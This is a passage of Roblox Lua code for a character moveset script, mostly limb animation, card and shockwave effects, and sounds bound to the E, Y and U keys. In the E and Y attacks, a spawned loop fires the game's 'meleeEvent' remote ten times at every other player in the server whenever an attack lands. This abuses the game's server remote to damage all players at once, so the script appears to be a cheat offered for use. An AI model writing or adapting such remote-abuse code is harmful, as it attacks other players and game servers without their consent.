table.insert(SlowlyFade,wave)
table.insert(th5,wavemesh)
removeuseless:AddItem(wave,2)
CardStorm = Instance.new("Part",Torso)
CardStorm.Size = Vector3.new(.1,.1,.1)
CardStorm.CFrame = Root.CFrame * CFrame.new(0,3.2,0)
CardStorm.Anchored = true
CardStormMesh = Instance.new("SpecialMesh", CardStorm)
CardStormMesh.Scale = Vector3.new(1,1,1)
CardStormMesh.MeshId = "rbxassetid://6512150"
CardStormMesh.TextureId = "rbxassetid://55364685"
table.insert(SlowlyFade,CardStorm)
table.insert(m3,CardStormMesh)
table.insert(th1,CardStorm)
removeuseless:AddItem(CardStorm,3)
wait(.1)
end
coroutine.wrap(function()
for i = 1, 10 do
so.Volume = so.Volume - 0.3
wait()
end
end)()
wait(1)
ws = 10
clean()
attacking = false
debounce = false
appi = false
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='e' then
if levitate then return end
if debounce then return end
attacking = true
debounce = true
damagedebounce = false
clickdisallowance = true
clickdebounce = false
notallowed = true
appi = true
ws = 0
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.y > 1 and attacking == true then
position = "Jump2"
elseif Root.Velocity.y < -1 and attacking == true then
position = "Falling2"
elseif Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
elseif Root.Velocity.Magnitude > 2 and attacking == true then
position = "Walking2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Jump2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Falling2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
elseif position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
elseif position == "Walking2" and attacking == true and appi == true then
change = .8
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.sin(25*math.sin(sine/8))),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.sin(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.sin(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.sin(25 * math.sin(sine/8))), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.sin(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.sin(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.sin(25 * math.sin(sine/8))), 0.3)
end
end
end)()
coroutine.wrap(function()
for i = 1, 40 do
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0),.5)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.2,1.5,0) * CFrame.Angles(math.rad(180 - 7 * math.sin(sine/6)),math.rad(7 * math.sin(sine/6)),math.rad(7*math.sin(sine/6))), 0.5)
swait()
end
end)()
haloh = Instance.new("Part", Torso)
haloh.Size = Vector3.new(1,1,1)
haloh.Anchored = false
haloh.Transparency = 1
haloh.CanCollide = false
halohweld = weldBetween(haloh,Torso)
halohweld.C0 = CFrame.new(0,0,0)
n = 0
x = 0
tab={}
tab2={}
SOUND(Torso,1882057730,6,false,2)
for i = 1, 20 do
n = n + 20
x = x + 5
halo = Instance.new("Part", Torso)
halo.Size = Vector3.new(0.71, 0.07, 0.99)
halo.Transparency = 1
halo.CanCollide = false
halo.Material = "Neon"
halo.BrickColor = BrickColor.new("White")
halow = weldBetween(halo,haloh)
halow.C0 = CFrame.new(-4,0,0) * CFrame.Angles(math.rad(90),math.rad(n),math.rad(0))
table.insert(FadeIn,halo)
table.insert(tab,halow)
table.insert(tab2,halo)
wait()
end
ws = 10
clickdisallowance = false
coroutine.wrap(function()
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
while notallowed do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.3)
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
swait()
end
end)()
coroutine.wrap(function()
mouse.Button1Down:connect(function()
if clickdisallowance then return end
if clickdebounce then return end
wait(.2)
clickdebounce = true
notallowed = false
end)
end)()
while notallowed do
for i,v in pairs(tab) do
v.C0 = v.C0 * CFrame.Angles(math.rad(0),math.rad(0 + 1.2),math.rad(0))
end
swait()
end
appi = false
ws = 0
for i = 1, 15 do
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(50), math.rad(0)), 0.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
swait()
end
for i,v in pairs(tab) do
v:Remove()
end
for i,v in pairs(tab2) do
removeuseless:AddItem(v,6)
MAKETRAIL(v,Vector3.new(.1,0,0),Vector3.new(-.1,0,0),.8,ColorSequence.new(BrickColor.new("White").Color,BrickColor.new("Really black").Color))
BodyGyro=Instance.new('BodyGyro',v)
BodyGyro.maxTorque=Vector3.new(math.huge,math.huge,math.huge)
BodyGyro.P=2e4
removeuseless:AddItem(BodyGyro,.1)
PB2 = Instance.new("BodyVelocity", v)
PB2.MaxForce = Vector3.new(999999, 999999, 999999)
v.CFrame = CFrame.new(v.Position,mouse.Hit.p)
PB2.Velocity = v.CFrame.lookVector * 80
end
SOUND(Torso,1499747506,3,false,1)
for i,v in pairs(tab2) do
v.Touched:connect(function(hit)
if hit.Parent:IsA("Part") then
elseif hit.Parent:IsA("SpecialMesh") then
elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
elseif hit.Parent:findFirstChildOfClass("Humanoid") then
if damagedebounce == true then return end
damagedebounce = true
Slachtoffer = hit.Parent:findFirstChildOfClass("Humanoid")
tor = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
SOUND(tor,694703797,6,false,1)
wait(.1)
damagedebounce = false
end
end)
end
for i = 1, 20 do
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-25), math.rad(0)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-15), math.rad(4)), 0.3)
swait()
end
clean()
g1:Remove()
haloh:Remove()
attacking = false
debounce = false
damagedebounce = false
clickdebounce = false
appi = false
ws = 10
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='y' then
if levitate then return end
if debounce then return end
clickdisallowance = true
clickdebounce = false
debounce = true
attacking = true
appi = true
ws = 0
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.y > 1 and attacking == true then
position = "Jump2"
elseif Root.Velocity.y < -1 and attacking == true then
position = "Falling2"
elseif Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
elseif Root.Velocity.Magnitude > 2 and attacking == true then
position = "Walking2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Jump2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Falling2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
elseif position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
elseif position == "Walking2" and attacking == true and appi == true then
change = .8
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
end
end
end)()
bigcard = Instance.new("Part",Torso)
bigcard.Material = "Neon"
bigcard.Transparency = 1
bigcard.BrickColor = BrickColor.new("White")
bigcard.Size = Vector3.new(15.65, 23.84, 0.3)
bigcard.CFrame = Root.CFrame * CFrame.new(0,18,0)
bigcard.Anchored = true
SOUND(bigcard,236989198,6,false,1)
ace = aces[math.random(1,#aces)]
acer = Instance.new("Decal",bigcard)
acer.Texture = "rbxassetid://"..ace
acer.Transparency = 1
acer.Face = "Front"
ace2 = acer:Clone()
ace2.Parent = bigcard
ace2.Face = "Back"
table.insert(FadeIn,acer)
table.insert(FadeIn,ace2)
table.insert(FadeIn,bigcard)
for i = 1, 30 do
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
swait()
end
ws = 10
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
clickdisallowance = false
coroutine.wrap(function()
mouse.Button1Down:connect(function()
if clickdisallowance then return end
if clickdebounce then return end
wait(.2)
clickdebounce = true
end)
end)()
while not clickdebounce do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
bigcard.CFrame = Root.CFrame * CFrame.new(0,18,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10 + 2 *math.sin(sine/12)),math.rad(10 - 2*math.sin(sine/12))),.3)
swait()
end
g1:Remove()
ws = 0
for i = 1, 13 do
bigcard.CFrame = bigcard.CFrame:lerp(Root.CFrame * CFrame.new(0,18,3) * CFrame.Angles(math.rad(10),0,0),.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0.2) * CFrame.Angles(math.rad(160),math.rad(10),math.rad(10)),.3)
swait()
end
locationpart = Instance.new("Part",bigcard)
locationpart.Size = Vector3.new(1,1,1)
locationpart.Transparency = 1
locationpart.CanCollide = false
locationpart.Anchored = true
locationpart.CFrame = Root.CFrame * CFrame.new(0,-3,-21)
shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = 0
shockwave.BrickColor = BrickColor.new("White")
shockwave.CFrame = CFrame.new(locationpart.Position)
shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(5,2,5)
shockwavemesh.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave,4)
shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = 0
shockwave2.BrickColor = BrickColor.new("White")
shockwave2.CFrame = CFrame.new(locationpart.Position)
shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(5,2,5)
shockwavemesh2.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave2,4)
shockwave3 = Instance.new("Part", Torso)
shockwave3.Size = Vector3.new(1,1,1)
shockwave3.CanCollide = false
shockwave3.Anchored = true
shockwave3.Transparency = 0
shockwave3.BrickColor = BrickColor.new("White")
shockwave3.CFrame = CFrame.new(locationpart.Position)
shockwavemesh3 = Instance.new("SpecialMesh", shockwave3)
shockwavemesh3.Scale = Vector3.new(5,2,5)
shockwavemesh3.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave3,4)
shockwave4 = Instance.new("Part", Torso)
shockwave4.Size = Vector3.new(1,1,1)
shockwave4.CanCollide = false
shockwave4.Anchored = true
shockwave4.Transparency = 0
shockwave4.BrickColor = BrickColor.new("White")
shockwave4.CFrame = CFrame.new(locationpart.Position)
shockwavemesh4 = Instance.new("SpecialMesh", shockwave4)
shockwavemesh4.Scale = Vector3.new(5,2,5)
shockwavemesh4.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave4,4)
Hit = damagealll(20,locationpart.Position)
for _,v in pairs(Hit) do			
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(locationpart.Position,torso.Position).lookVector*110
removeuseless:AddItem(vel,.1)
end
coroutine.wrap(function()
for i = 1, 90 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+12),0)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(1.5,.1,1.5)
shockwave.Transparency = shockwave.Transparency + 0.025
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+6),0)
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(1.25,.25,1.25)
shockwave2.Transparency = shockwave2.Transparency + 0.04
shockwave3.CFrame = shockwave3.CFrame * CFrame.Angles(0,math.rad(0+12),0)
shockwavemesh3.Scale = shockwavemesh3.Scale + Vector3.new(.75,.75,.75)
shockwave3.Transparency = shockwave3.Transparency + 0.035
shockwave4.CFrame = shockwave3.CFrame * CFrame.Angles(0,math.rad(0+5),0)
shockwavemesh4.Scale = shockwavemesh3.Scale + Vector3.new(2.5,.5,2.5)
shockwave4.Transparency = shockwave3.Transparency + 0.03
swait()
end
end)()
SOUND(locationpart,765590102,6,false,2)
for i = 1, 24 do
bigcard.CFrame = bigcard.CFrame:lerp(Root.CFrame * CFrame.new(0,-3,-21) * CFrame.Angles(math.rad(90),0,0),.25)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(.2,.2,.2) * CFrame.Angles(0,0,0),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1, 1.1, 0.4) * CFrame.Angles(math.rad(-75), math.rad(15), math.rad(4)), 0.5)
swait()
end
for i = 1, 40 do
bigcard.Transparency = bigcard.Transparency + 0.2
acer.Transparency = acer.Transparency + .2
ace2.Transparency = ace2.Transparency + .2
swait()
end
attacking = false
debounce = false
appi = false
clickdisallowance = false
clickdebounce = false
ws = 10
bigcard:Remove()
clean()
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='u' then
if levitate then return end
if mouse.Target ~= nil then end
if debounce then return end
debounce = true
attacking = true
appi = true
ws = 0
appi = true
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.y > 1 and attacking == true then
position = "Jump2"
elseif Root.Velocity.y < -1 and attacking == true then
position = "Falling2"
elseif Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
elseif Root.Velocity.Magnitude > 2 and attacking == true then
position = "Walking2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Jump2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Falling2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
elseif position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
elseif position == "Walking2" and attacking == true and appi == true then
change = .8
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
